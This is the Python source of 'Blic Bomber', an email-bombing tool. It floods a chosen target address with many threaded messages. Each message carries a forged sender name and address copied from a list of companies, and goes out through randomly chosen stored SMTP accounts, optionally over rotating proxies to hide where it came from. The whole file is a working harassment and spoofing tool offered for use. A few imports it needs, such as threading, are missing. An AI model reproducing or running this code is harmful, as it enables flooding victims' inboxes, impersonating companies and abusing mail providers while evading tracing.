import shutil
import ctypes
import random
import socket
import socks
import time
import os

import fade
from rich.console import *
from rich.progress import Progress
from colorama import *

import inquirer
from questions import questions
from proxies import get_proxies

import json
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

banner = """
██████╗ ██╗     ██╗ ██████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔══██╗██║     ██║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝██║     ██║██║         ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══██╗██║     ██║██║         ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██████╔╝███████╗██║╚██████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚═════╝ ╚══════╝╚═╝ ╚═════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝

           _____
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~```````````````##(_))#H\`````Y########
                          ))    \#H\       `Y###
                      }#H)"""

ioBanner = """
██╗███╗   ██╗██╗   ██╗ █████╗ ██╗     ██╗██████╗ 
██║████╗  ██║██║   ██║██╔══██╗██║     ██║██╔══██╗
██║██╔██╗ ██║██║   ██║███████║██║     ██║██║  ██║
██║██║╚██╗██║╚██╗ ██╔╝██╔══██║██║     ██║██║  ██║
██║██║ ╚████║ ╚████╔╝ ██║  ██║███████╗██║██████╔╝
╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝╚═════╝ 
                                                 
 ██████╗ ██████╗ ████████╗██╗ ██████╗ ███╗   ██╗ 
██╔═══██╗██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║ 
██║   ██║██████╔╝   ██║   ██║██║   ██║██╔██╗ ██║ 
██║   ██║██╔═══╝    ██║   ██║██║   ██║██║╚██╗██║ 
╚██████╔╝██║        ██║   ██║╚██████╔╝██║ ╚████║ 
 ╚═════╝ ╚═╝        ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ 

"""

center = shutil.get_terminal_size().columns

try:
    kernel = ctypes.windll.kernel32.SetConsoleTitleW
except:
    print("ctypes.windll is not supported on linux")

r = Fore.RED
m = Fore.MAGENTA
rst = Fore.RESET

class Stats:
    sent = 0
    failed = 0

class Bomber:
    def __init__(self) -> None:
        self.cBanner = "\n".join(line.center(center) for line in banner.splitlines())
        self.ioCBanner = "\n".join(line.center(center) for line in ioBanner.splitlines())
        self.cool_graphics()
        self.answers = inquirer.prompt(questions)
        self.target = self.answers["target"]
        self.amount = self.answers["amount"]
        self.delay = self.answers["delay"]
        self.use_proxies = self.answers["proxies"]
        self.available_proxies = get_proxies()

    def clear(self) -> None:
        os.system("cls" if os.name == "nt" else "clear")

    def cool_graphics(self) -> None:
        self.clear()
        try:
            kernel(f"Blic Bomber   |   Sent: {Stats.sent}  Failed: {Stats.failed}   |   Proxy: {'Active' if self.available_proxies else 'None'}   |   Python Version: {platform.python_version()}")
        except:
            pass
        print(fade.purplepink(self.cBanner))

    def bomb(self) -> None:
        try:
            with open('transcripts/config.json', 'r') as f:
                config_data = json.load(f)

            from_list = config_data.get('From', {})
            subject_list = config_data.get('Subject', {})
            body_list = config_data.get('Bodies', {})

            msg = MIMEMultipart("related")

            random_company = random.choice(list(from_list.keys()))
            company_info = from_list.get(random_company, {})

            spoofed_name = company_info.get('Name', '')
            spoofed_email = company_info.get('Email', '')

            random_subject = random.choice(list(subject_list.values()))
            random_body = random.choice(list(body_list.values()))

            msg['From'] = f"{spoofed_name} <{spoofed_email}>"
            msg['To'] = self.target
            msg['Subject'] = random_subject
            msg.attach(MIMEText(random_body, 'plain'))

            with open("transcripts/smtps.json", "r") as f:
                smtp_data = json.load(f)

            service_name = random.choice(list(smtp_data.keys()))
            service_data = smtp_data[service_name]

            smtp_host = service_data["smtp_server"]
            smtp_port = service_data["smtp_port"]

            user_id = random.choice([key for key in service_data["registered_users"] if key.isdigit()])
            user_data = service_data["registered_users"][user_id]

            smtp_username = user_data['user']
            smtp_password = user_data['password']

            if self.use_proxies == "yes":
                proxy = random.choice(self.available_proxies)
                proxy_ip = proxy.split(":")[0]
                proxy_port = int(proxy.split(":")[1])

                for proxy_type in [socks.SOCKS5, socks.SOCKS4, socks.HTTP]:
                    try:
                        with smtplib.SMTP(smtp_host, smtp_port) as server:
                            server.sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                            server.sock.set_proxy(proxy_type, proxy_ip, proxy_port)
                            server.starttls()
                            server.login(smtp_username, smtp_password)
                            text = msg.as_string()
                            server.sendmail(from_addr=spoofed_email, to_addrs=self.target, msg=text)
                            Stats.sent += 1
                            break
                    except:
                        Stats.failed += 1

            else:
                try:
                    with smtplib.SMTP(smtp_host, smtp_port) as server:
                        server.starttls()
                        server.login(smtp_username, smtp_password)
                        text = msg.as_string()
                        server.sendmail(from_addr=spoofed_email, to_addrs=self.target, msg=text)
                        Stats.sent += 1
                except:
                    Stats.failed += 1

        except Exception as e:
            print(f"Error: {e}")
                   
    def start(self) -> None:
        for _ in range(int(self.amount)):
            try:
                threading.Thread(target=self.bomb).start()
            except:
                pass

            time.sleep(int(self.delay))
